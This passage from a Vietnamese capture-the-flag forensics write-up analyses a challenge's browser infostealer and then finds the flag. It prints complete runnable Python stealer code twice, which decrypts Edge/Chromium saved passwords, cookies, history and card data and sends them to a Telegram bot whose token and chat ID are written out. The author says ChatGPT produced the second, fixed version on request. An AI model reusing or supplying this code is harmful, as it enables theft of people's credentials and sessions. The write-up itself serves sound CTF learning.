    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key


def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


def save_results(browser_name, type_of_data, content):
    if not os.path.exists('C:/Users/Public/Snake/' + browser_name):
        os.mkdir('C:/Users/Public/Snake/' + browser_name)
    if content is not None:
        open(f'C:/Users/Public/Snake/{browser_name}/{type_of_data}.txt', 'w', encoding="utf-8").write(content)
        


def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    shutil.copy(db_file, 'temp_db')
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_password(row[i], key)
        if data_type_name == 'history':
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove('temp_db')
    return result


def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')


def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available


if __name__ == '__main__':
    api = 'https://api.telegram.org/bot6685689576:AAEZDTUeHWzc7nqK84T7IhtBKJyZ0cUbIZo/sendDocument'; id = '5814016276'

    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        for data_type_name, data_type in data_queries.items():
            data = get_data(browser_path, "Default", master_key, data_type)
            save_results(browser, data_type_name, data)
            with open(f'C:/Users/Public/Snake/{browser}/{data_type_name}.txt', "rb") as exfildat:
                requests.post(api, data={'caption': "------Exfiltrated Data------ \n Browser: " + browser + "\n Type: " + data_type_name,'chat_id': id}, files={'document': exfildat})
```

Nội dung chính của đoạn code trên:

```
1 Trích xuất dữ liệu người dùng:

- Mã định nghĩa một số loại dữ liệu cần trích xuất từ các trình duyệt: mật khẩu (login data), thông tin thẻ tín dụng (credits card), cookie, lịch sử duyệt web (history), và tệp tải về (downloads).
- Các truy vấn SQL tương ứng được định nghĩa để lấy dữ liệu từ các tệp SQLite (các tệp cơ sở dữ liệu của trình duyệt) và các cột dữ liệu như URL, tên người dùng, mật khẩu, v.v.

2. Lấy và giải mã khóa chính (Master Key):
- Hàm get_master_key tìm kiếm khóa chính (encrypted key) từ tệp "Local State" của trình duyệt. Nếu tệp này chứa khóa mã hóa,
- Nếu tệp này chứa khóa mã hóa, Nó sẽ giải mã khóa bằng cách sử dụng phương pháp CryptUnprotectData của Windows và trả về khóa giải mã.

3. Giải mã mật khẩu:
Hàm decrypt_password nhận dữ liệu đã mã hóa và sử dụng AES GCM để giải mã dữ liệu đó. Dữ liệu mật khẩu sẽ được giải mã và trả về dưới dạng chuỗi.

4.Trích xuất dữ liệu từ cơ sở dữ liệu của trình duyệt:
- Các hàm như get_data thực hiện sao chép các cơ sở dữ liệu của trình duyệt vào một tệp tạm thời, sau đó kết nối với cơ sở dữ liệu SQLite và thực hiện các truy vấn SQL để lấy dữ liệu.
- Nếu dữ liệu được mã hóa (như mật khẩu), nó sẽ được giải mã. Lịch sử duyệt web được chuyển đổi từ định dạng thời gian Chrome (microseconds từ năm 1601) sang định dạng ngày giờ dễ đọc.

5. Lưu kết quả:
- Dữ liệu trích xuất được lưu vào các tệp văn bản trên hệ thống (ví dụ: C:/Users/Public/Snake/{browser}/{data_type_name}.txt).
- Gửi dữ liệu tới Telegram:

Sau khi trích xuất dữ liệu, tệp dữ liệu sẽ được gửi đến một bot Telegram thông qua API của Telegram.
Bot sẽ gửi các tệp dữ liệu (như mật khẩu, cookie) kèm theo thông tin về trình duyệt và loại dữ liệu đã bị trích xuất.
```

Mình nhờ chatgpt viết 1 đoạn python để trích xuất từ trình duyệt các thông tin như (login data), (credits card), (history), (downloads) và gửi chúng đến **bot** -> nhận được phản hồi

```
import base64
import json
import os
import shutil
import sqlite3
from datetime import datetime, timedelta
import requests

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

appdata = os.getenv('LOCALAPPDATA')

browsers = {
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    # Add other browsers here...
}

data_queries = {
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    # Other data types...
}


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key


def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16]  # Remove the authentication tag

    try:
        # Attempt to decode the result as UTF-8, ignoring invalid characters
        decrypted_pass = decrypted_pass.decode('utf-8', errors='ignore')
    except UnicodeDecodeError:
        # If decoding fails, return the raw bytes or handle as needed
        decrypted_pass = decrypted_pass.hex()  # or return decrypted_pass for raw bytes

    return decrypted_pass


def save_results(browser_name, type_of_data, content):
    base_path = 'C:/Users/Public/Snake/'
    if not os.path.exists(base_path):
        os.mkdir(base_path)
    browser_path = base_path + browser_name
    if not os.path.exists(browser_path):
        os.mkdir(browser_path)

    if content is not None:
        file_path = f'{browser_path}/{type_of_data}.txt'
        with open(file_path, 'w', encoding="utf-8") as f:
            f.write(content)


def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    try:
        shutil.copy(db_file, 'temp_db')
    except PermissionError:
        print(f"Permission denied: {db_file}")
        return  # Skip if file can't be copied

    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_password(row[i], key)
        if type_of_data['file'] == '\\History':
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove('temp_db')
    return result


def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')


def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available


if __name__ == '__main__':
    api = 'https://api.telegram.org/bot6685689576:AAEZDTUeHWzc7nqK84T7IhtBKJyZ0cUbIZo/sendDocument'
    id = '5814016276'

    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        for data_type_name, data_type in data_queries.items():
            data = get_data(browser_path, "Default", master_key, data_type)
            if data:
                save_results(browser, data_type_name, data)
                file_path = f'C:/Users/Public/Snake/{browser}/{data_type_name}.txt'
                if os.path.exists(file_path):
                    with open(file_path, "rb") as exfildat:
                        response = requests.post(api, data={'caption': f"------Exfiltrated Data------ \n Browser: {browser} \n Type: {data_type_name}", 'chat_id': id}, files={'document': exfildat})
                        print(response.text)  # Log the response from Telegram API
                else:
                    print(f"File {file_path} not found.")

```

Mình đã chạy đoạn mã này trên máy ảo và những thông tin trích xuất sẽ nằm trong path: C:\Users\Public\Snake\microsoft-edge

![image](https://github.com/user-attachments/assets/3a89fec3-7819-4f9d-990f-bd858879939c)

Mình khá bất ngờ khi mở file .txt ra lại có hết những thông tin đăng nhập, lịch sử, ... trên máy thật của mình ( quả này mình đã nghĩ đến việc mấy anh tạo ra con bot sẽ nhìn thấy hết mất 😥)

Khi đc các anh báo lại thì mình vô phần profile của tài khoản mình ở trình duyệt trên máy thật thì phát hiện là mình đã đồng bộ 2 tài khoản lúc nào không hay 

**Đây là máy chính**

![image](https://github.com/user-attachments/assets/2429fb98-8bf0-45a0-80d9-82344fd0e1e3)

**Và đây là máy ảo**

![image](https://github.com/user-attachments/assets/2702b0b9-8c46-48ba-93eb-b1306eb39711)

Haizz đây đúng là 1 bài học của mình

Quay trở lại vấn đề chính, là mình đã trích xuất được ra những file .txt ở kia nhưng vẫn kh biết làm cách nào để nhận được flag :(

Mình đã thử rất nhiều cách và phải cho đến khi hết giải mình mới tìm ra solution [tại đây](https://github.com/soxoj/telegram-bot-dumper)

Hmm giờ thì làm theo hướng dẫn thôi

Vô [đây](https://core.telegram.org/bots/api) để lấy api và hash về

Mình clone link github đó về và thực hiện lần lượt theo hướng dẫn

![image](https://github.com/user-attachments/assets/df710174-556d-438e-904a-91ccfaae613a)

Đến đây thì mình bị lỗi nên mình sử dụng môi trường ảo để cài

![image](https://github.com/user-attachments/assets/411c9521-6660-4028-beb7-c593901e939c)

Và sau đó là bước cuối 

![image](https://github.com/user-attachments/assets/45da01f3-dcd8-4fe6-b65d-753ac1e59d52)

Có 1 đoạn rất giống base64 ở mục Name

```
Qk9UOiBLQ1NDe0V4RjFsVHJhdGkwbl8wdjNyX1QzTDNnckBtP30=
```

Đem đi decode và nhận đc flag

![image](https://github.com/user-attachments/assets/e8d870d9-111c-4e9e-8e06-25564efeec4c)

```
Flag: KCSC{ExF1lTrati0n_0v3r_T3L3gr@m?}
```

# _TỔNG KẾT_

_Mình vẫn hơi tiếc khi chưa thể solve thêm 1->2 bài FOR nữa trong lúc giải diễn ra, nhưng mình vẫn rất cảm ơn mọi người khi đã đọc đến đây._ 

**Goodbye!!**
